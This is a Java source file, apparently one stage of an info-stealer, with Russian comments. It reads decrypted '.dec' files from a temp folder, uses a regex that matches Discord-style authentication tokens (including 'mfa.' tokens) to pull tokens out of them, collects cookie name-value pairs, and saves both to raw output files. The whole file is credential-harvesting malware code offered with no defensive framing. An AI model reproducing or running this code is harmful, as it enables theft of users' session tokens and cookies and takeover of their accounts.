import java.io.*;
import java.nio.file.*;
import java.util.regex.*;
import java.util.*;

public class TokenExtractor {
    private static final String DEC_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
    private static final String OUTPUT_DIR = DEC_DIR + "\\extracted";
    private static final String TOKEN_PATTERN = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}";
    
    public static void main(String[] args) {
        new File(OUTPUT_DIR).mkdirs();
        extractAll();
    }
    
    private static void extractAll() {
        StringBuilder tokens = new StringBuilder();
        StringBuilder cookies = new StringBuilder();
        
        File decFolder = new File(DEC_DIR);
        File[] decFiles = decFolder.listFiles((d, n) -> n.endsWith(".dec"));
        if (decFiles == null) return;
        
        for (File f : decFiles) {
            try {
                String content = new String(Files.readAllBytes(f.toPath()));
                
                // Ищем токены
                Pattern p = Pattern.compile(TOKEN_PATTERN);
                Matcher m = p.matcher(content);
                while (m.find()) {
                    tokens.append(m.group()).append("\n");
                }
                
                // Ищем куки (session_id, __Secure, etc)
                Pattern cookieP = Pattern.compile("([\\w_]+)=([^;\\n]+)");
                Matcher cookieM = cookieP.matcher(content);
                while (cookieM.find()) {
                    cookies.append(cookieM.group(1)).append("=").append(cookieM.group(2)).append("\n");
                }
            } catch (Exception e) {}
        }
        
        // Сохраняем результат
        try {
            Files.write(Paths.get(OUTPUT_DIR + "\\tokens_raw.txt"), tokens.toString().getBytes());
            Files.write(Paths.get(OUTPUT_DIR + "\\cookies_raw.txt"), cookies.toString().getBytes());
        } catch (Exception e) {}
    }
}